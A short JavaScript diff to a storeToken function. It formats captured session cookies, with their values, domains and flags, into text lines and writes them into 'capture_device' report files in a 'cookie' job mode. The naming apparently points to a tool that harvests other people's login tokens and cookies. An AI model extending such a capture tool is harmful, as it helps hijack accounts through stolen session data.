@@ -651,7 +651,10 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
       // For cookie mode, include actual cookies in the report
       if (job.mode === 'cookie' && cookieConversionResult && cookieConversionResult.success && cookieConversionResult.cookies) {
-        fileContent += '\n\nCOOKIES:\n' + cookieConversionResult.cookies;
+        const cookieText = Array.isArray(cookieConversionResult.cookies)
+          ? cookieConversionResult.cookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`).join('\n')
+          : String(cookieConversionResult.cookies);
+        fileContent += '\n\nCOOKIES:\n' + cookieText;
       }
 
       const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;
